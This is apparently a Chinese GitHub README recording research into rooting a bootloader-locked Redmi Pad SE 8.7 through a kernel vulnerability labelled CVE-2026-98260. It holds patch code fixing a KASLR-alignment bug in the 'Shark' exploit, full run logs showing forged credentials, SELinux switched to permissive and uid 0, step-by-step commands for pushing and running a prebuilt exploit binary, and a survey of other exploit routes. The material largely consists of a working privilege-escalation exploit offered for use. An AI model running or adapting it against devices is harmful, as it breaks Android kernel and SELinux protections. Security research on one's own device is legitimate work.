# Redmi Pad SE 8.7 免解锁 ROOT 研究全记录

[**中文**](README.md) · [English](README.en.md)

> 在 **bootloader 保持锁定、全程零分区写入、设备未变砖** 的前提下，
> 通过 `CVE-2026-98260` 拿到 **完整内核级 ROOT**（`uid=0` + `u:r:ksu:s0` + 完整 capability + KernelSU）。

[![Device](https://img.shields.io/badge/device-Redmi%20Pad%20SE%208.7%20(flare)-orange)]()
[![Android](https://img.shields.io/badge/Android-16%20%2F%20HyperOS%203.0.303-green)]()
[![Kernel](https://img.shields.io/badge/kernel-6.6.118--android15--8-blue)]()
[![CVE](https://img.shields.io/badge/CVE--2026--98260-red)]()
[![Bootloader](https://img.shields.io/badge/bootloader-LOCKED-critical)]()

---

## 一、最终结果

```console
$ adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

$ adb shell su -c 'grep Cap /proc/self/status'
CapInh: 0000000000000000
CapPrm: 000001ffffffffff       ← 完整能力集
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff

$ adb shell su -c 'ls /data/adb'
ksu
ksud

$ adb shell su -c 'cat /proc/self/attr/current; getenforce'
u:r:ksu:s0
Enforcing

$ adb shell grep kernelsu /proc/modules
kernelsu 180224 4 - Live 0x0000000000000000 (O)
```

**性质：临时 ROOT。** 改的都只是内核内存，重启后消失，重跑一条命令即可恢复。
**bootloader 始终 locked（`verifiedbootstate=green`），没有刷任何东西。**

---

## 二、目标设备

| 项 | 值 |
|---|---|
| 机型 | Redmi Pad SE 8.7 |
| 代号 | `flare` |
| 型号 | `24075RP89G` |
| SoC | MediaTek **MT8786V/N** |
| 系统 | HyperOS `OS3.0.303.0.WHXMIXM` |
| Android | 16（`BP2A.250605.031.A3`）|
| 内核 | `6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k` |
| 安全补丁 | 2026-09-01 |
| Bootloader | **locked** / `verifiedbootstate=green` |
| 起始权限 | adb shell = `uid=2000`，无 root |
| SELinux | Enforcing |

---

## 三、★ 核心突破：一个「KASLR 对齐假设」导致的 bug

这一节是整个项目最有价值的部分。**如果你只读一节，读这节。**

### 3.1 现象

用公开的 Shark 源码（fork v2.3.2）编译出来的 exploit，永远停在这里：

```
[calib] timers=0
[base] made=512 timers=0 pages=15 best=0 count=0
[-] base calibration failed
```

但**上游发布的二进制（v2.5.1）在同一台机器上能跑通**，`timers=512`。

**源码和二进制行为不一致** —— 说明上游改了代码但没回流到公开源码。

### 3.2 定位

`scan_timer_allocs()` / `scan_task_allocs()` 从 trace 里读 `call_site`，
然后**用低 21 位去和「链接地址的低 21 位」硬比**：

```c
if ((site & 0x1fffffULL) != TIMER_SITE_LOW21)
    continue;
```

**问题：低 21 位会随 KASLR slide 的 `mod 2MiB` 分量一起平移。**

我们这台机器的实测值：

```python
slide               = 0x2b45280000
slide & 0x1fffff    = 0x80000          # ← 不是 0！
```

于是：

| 符号 | 链接地址低21位 | **运行时低21位** | 源码比较的 | 结果 |
|---|---|---|---|---|
| `do_timer_create+0xa8` | `0x195d48` | **`0x15d48`** | `0x195d48` | ✗ 永不匹配 |
| `copy_process+0x140` | `0x0ab93c` | **`0x12b93c`** | `0x0ab93c` | ✗ 永不匹配 |

**证据链**：从成功运行的日志反推 ——

```
[cred] site_low=0x164064                        ← prepare_creds+0x24 的运行时低21位
prepare_creds+0x24 链接低21位 = 0xe4064
差值 = 0x164064 - 0xe4064 = 0x80000             ← 正好等于 slide mod 2MiB
```

而 cred 那条之所以能拿到（日志里 `recs=1`），是因为它的过滤常量被设成了 `0`（跳过检查）。
task 那条硬过滤，所以永远 `task_recs=0`。

### 3.3 为什么上游能跑通

因为原作者在 probe 里写了硬性前提：

```c
g_slide = site0 - STATIC_TIMER_SITE;
printf("PROBE_SLIDE=%#llx aligned=%d\n", g_slide, (g_slide & 0x1fffff) == 0);
if (g_slide & 0x1fffff)
    return 1;              // ★ 非 2MiB 对齐直接放弃
```

**他验证过的那台机器 KASLR 是 2MiB 对齐的（`aligned=1`）。我们这台是 512KB 对齐（`aligned=0`）。**

### 3.4 修法：自校准

ARM64 的 KASLR 对齐只可能是 `0x80000` 的倍数，所以 `slide mod 2MiB` **只有 4 个候选**：
`0 / 0x80000 / 0x100000 / 0x180000`。

**让程序自己把这 4 个候选各试一遍，取命中最多的那个：**

```c
static unsigned long long g_low_adj = 0ULL;   /* slide 的 mod-2MiB 分量 */

/* 所有低21位比较都加上它 */
if ((site & 0x1fffffULL) != ((TIMER_SITE_LOW21 + g_low_adj) & 0x1fffffULL))
    continue;
```

```c
/* 校准阶段扫 4 个候选 */
static const unsigned long long cands[4] = {0ULL, 0x80000ULL, 0x100000ULL, 0x180000ULL};
int best_ci = 0, c = 0;
for (int ci = 0; ci < 4; ci++) {
    int cc;
    g_low_adj = cands[ci];
    cc = scan_timer_allocs(raw, n, me, ptrs, 512, NULL);
    if (cc > c) { c = cc; best_ci = ci; }
}
g_low_adj = cands[best_ci];
c = scan_timer_allocs(raw, n, me, ptrs, 512, NULL);  /* 用最终值重新收集 */
```

再把那个 `aligned` 硬检查放宽：

```c
/* 改前：if (g_slide & 0x1fffffULL) return 1; */
if ((g_slide & 0x1fffffULL) && (g_slide & 0x7ffffULL))
    return 1;
```

### 3.5 修复后立竿见影

```
PROBE_TIMER made=128 recs=128 site=0xffffffebc5415d48 low_adj=0x80000
PROBE_SLIDE=0x2b45280000 aligned=0
[calib] timers=512 low_adj=0x80000
[base] made=512 timers=512 pages=21 best=0xffffff7fc0000000 count=330
[cred] R=0xffffff80c117a180 site_low=0x164064 recs=1
       task=0xffffff807a40cb00 task_recs=1          ← 从 0 变成 1
PROBE_OK
```

**完整补丁见 [`artifacts/patch_shark_low21.py`](artifacts/patch_shark_low21.py)。**

---

## 四、成功的完整链路

```console
$ adb shell "cd /data/local/tmp && \
    PYB110_KSUD=/data/local/tmp/ksud33 \
    PYB110_MANAGER_PKG=me.weishu.kernelsu \
    PYB110_KMI=android15-6.6 \
    ./shark66118 --auto"
```

```
[calib] timers=512 low_adj=0x80000
[base] best=0xffffff7fc0000000 count=202
[cred] R=0xffffff80f9faaef0 task=0xffffff... task_recs=1
[+] stage fake_cred  ... free_seen=1 burst hit=1 after 48ms    ← 伪造完整能力 cred
[+] stage selinux    ... free_seen=1 burst hit=1 after 132ms   ← SELinux → Permissive
[ksu] panic_on_warn=0
[+] stage fake_uid   ... free_seen=1 burst hit=1 after 103ms   ← resuid=0/0/0
[+] cred writes landed, waking child
[child] woke uid=0 euid=0
[+] child report stage=2 uid=0 euid=0 resuid=0/0/0
PLANT_CRED_OK child=19711
PARKED=1
LATE_LOAD_CMD='/data/local/tmp/ksud33' late-load --kmi android15-6.6 \
    --allow-shell --package-name me.weishu.kernelsu
LATE_LOAD_RC=0
LATE_LOAD_SHELL_RC=0
```

```console
$ adb shell grep kernelsu /proc/modules
kernelsu 180224 4 - Live 0x0000000000000000 (O)

$ adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
```

**三个阶段各自需要一次成功的页回收（`burst hit=1`），所以第一次可能失败 —— 重跑即可。**

**详细复现步骤见 [`docs/11-reproduce.md`](docs/11-reproduce.md)。**

---

## 五、走了哪些弯路（避雷区）

我们花了极长时间试遍了几乎所有路线。**下面这些全部是死路，别再试了。**

| 路线 | 为什么不通 | 证据 |
|---|---|---|
| **CVE-2026-43499**（GhostLock，4 个公开仓库） | 我们内核已 backport 修复 | 反汇编 `remove_waiter` 全程**没有** `mrs sp_el0`，用的是 `waiter->task` |
| **CVE-2026-46242**（Bad Epoll，99% 成功率的 PoC） | 已修补 | `ep_remove` 里有 `getxr/stlxr` 原子递增 pin + `cbz` 跳过临界区 + 末尾 `fput` |
| **mqsas**（`miui.mqsas.IMQSNative`，小米服务提权） | 三重封堵 | ① 方法号 16–30 全不存在（公开 exploit 要用 21）；② `runCommand` 有命令白名单；③ 后端 `mqsasd` 守护进程根本没在跑 |
| **Magica**（permissive 后 app zygote 可 setuid） | 需要 Permissive 且要重启 zygote，我们没有可行的触发方式 | 我们只能改内核内存，改不了 `ro.boot.selinux` |
| **MTK BROM / mtkclient / penumbra** | 小米同时开 **BROM SLA + DAA** | penumbra 官方 FAQ：*"not enough to cover all devices, especially Xiaomi … you'll need paid auth"* |
| **fenrir**（bl2_ext 未验证 → EL3） | 需要**先解锁**才能刷 | README 原文：*"When the bootloader is **unlocked** (seccfg)…"*，仓库已归档 |
| **lkpatcher** | 需要 mtkclient 先解锁 seccfg；且补丁是 32 位 Thumb，我们是 arm64 | README 原文 |
| **Kamakiri** | 2023+ 芯片 BROM 已修 | `USB_Endpoint0_Idle` 加了 `wIndex` 边界检查 |
| **Heapbait** | DA2 2024-11 已修，我们固件 2026-07 | penumbra 文档 |
| **Carbonara** | 需要签名 DA1 + 付费 SLA | penumbra 文档 |
| **DirtyFrag / Dirty Pipe** | 已修 | — |
| **userfaultfd 系列** | `/proc/sys/vm/unprivileged_userfaultfd = 0` | 设备实测 |
| **NFC 系列 CVE** | 设备没有 NFC 硬件 | 无 `/dev/nfc*` |
| **5 个 nginx CVE**（123007/123633/123634/121810/113425） | 与安卓完全无关 | 都是 NGINX2Root 服务器漏洞 |
| **binder 的两个 UAF**（6.6.145 修） | 二进制显示未修补，但是竞争型，工程量大 | `binder_free_transaction` 里没有 `put_task_struct` —— **这条其实还有戏，只是我们没继续** |

**详细分析见 [`docs/03-dead-ends.md`](docs/03-dead-ends.md)。**

---

## 六、目录结构

```
.
├── README.md                      ← 你在这里
├── docs/
│   ├── 01-device.md               设备信息与基线
│   ├── 02-methodology.md          侦察方法论（怎么系统地排除路线）
│   ├── 03-dead-ends.md            ★ 所有死路与证据（避雷核心）
│   ├── 04-vulnerability.md        CVE-2026-98260 原理
│   ├── 05-kaslr.md                KASLR 泄露（tracefs raw 记录法）
│   ├── 06-slab-layout.md          slab 布局与对象测量
│   ├── 07-carriers.md             载体对比：pipe vs AIO vs VMA
│   ├── 08-exact-hit.md            EXACT HIT：先确认命中再动手
│   ├── 09-root-cause.md           ★★ 2MiB 对齐假设 bug（最核心）
│   ├── 10-breakthrough.md         完整成功链逐阶段解读
│   ├── 11-reproduce.md            ★ 从零复现指南
│   ├── 12-pitfalls.md             ★ 踩过的坑（含 9 次编码事故）
│   └── 13-timeline.md             整个研究的时间线
├── artifacts/
│   ├── shark-k66118-fixed         修好的 exploit（aarch64 静态）
│   ├── plant_core.patched.inc     打过补丁的源码
│   ├── patch_shark_low21.py       补丁脚本（可重放）
│   ├── ksud-3.3.1                 匹配版本的 ksud
│   └── SHA256SUMS
├── tools/                         我们写的诊断工具源码
│   ├── pwn_min.c                  最小 Stage A 实现
│   ├── cred_finder.c              perf 采样找 cred 地址
│   ├── trace_probe.c              kprobe / free_slab / folio 验证
│   ├── task_finder.c              task_struct 分配 call_site 探测
│   ├── surf_probe.c / surf_probe2.c   攻击面可达性探测
│   ├── kaslr_leak.c               KASLR 泄露独立实现
│   ├── kmem_perf.c                perf kmem tracepoint 读取参考
│   └── aio_probe.c                AIO 载体容量验证
└── scripts/
    ├── build.sh                   编译所有工具
    └── check-device.sh            设备兼容性检查
```

---

## 七、快速开始

```bash
# 0. 检查设备是否匹配
./scripts/check-device.sh

# 1. 推 exploit 和 ksud
adb push artifacts/shark-k66118-fixed /data/local/tmp/shark66118
adb push artifacts/ksud-3.3.1        /data/local/tmp/ksud33
adb shell 'chmod 755 /data/local/tmp/shark66118 /data/local/tmp/ksud33'

# 2. 装 KernelSU 管理器（必须是 v3.3.1 / build 32680）
adb install -r -g KernelSU_v3.3.1_32680-release.apk

# 3. 开打（可能第一次失败，重跑即可）
adb shell "cd /data/local/tmp && \
  PYB110_KSUD=/data/local/tmp/ksud33 \
  PYB110_MANAGER_PKG=me.weishu.kernelsu \
  PYB110_KMI=android15-6.6 \
  ./shark66118 --auto"

# 4. 验证
adb shell su -c id
```

---

## 八、成功率与风险

| 项 | 观察 |
|---|---|
| 单次完整成功率 | 约 **2/3**（实测 3 次里 2 次完整成功） |
| 失败时行为 | 输出 `PARKED`，**保留僵尸不盲 reap，不会崩** |
| 内核 panic | 修复后跑了约 6 次，**0 次** |
| 变砖风险 | **零** —— 全程零分区写入 |
| 数据风险 | 低（panic 时若正有文件在写可能损坏） |
| 重启后果 | root 消失，需重跑；设备完全正常 |

**为什么不会砖**：exploit 源码里搜索 `/dev/block`、`by-name`、`mmcblk`、`dd if=`、`flash`、`reboot`、`insmod` ——
**一个都没有**。它只改内核内存。

---

## 九、致谢与来源

| 项目 | 用途 |
|---|---|
| [kpgc10kai/Shark](https://github.com/kpgc10kai/Shark) | 源基础（上游 v2.3.2 的 fork） |
| [Yunnijian/Shark-Releases](https://github.com/Yunnijian/Shark-Releases) | 上游二进制（v2.5.1），行为参照 |
| [fynks/awesome-temporary-root](https://github.com/fynks/awesome-temporary-root) | 找到 Shark 的关键索引（记录了同内核机型的成功案例） |
| [quyicheng03-boop/CVE-2026-98260-popsicle-android](https://github.com/quyicheng03-boop/CVE-2026-98260-popsicle-android) | EXACT HIT 方法论 |
| [WantenMN/cve-2026-98260-adb](https://github.com/WantenMN/cve-2026-98260-adb) | 「拿精确 node 偏移」的思路 |
| [vvb2060/Magica](https://github.com/vvb2060/Magica) | permissive → setuid 的 AOSP 机制说明 |
| [R0rt1z2/penumbra](https://github.com/R0rt1z2/penumbra) | MTK BROM/DA 的权威文档（用来确认死路） |

---

## 十、免责声明

**本项目仅用于本人持有设备的授权安全研究。**

- 只对**你自己拥有的设备**使用
- 内核漏洞利用可能触发 panic，虽然本项目不写分区、不会砖，但仍请自行承担风险
- 不要用于任何未经授权的设备

**License: MIT**
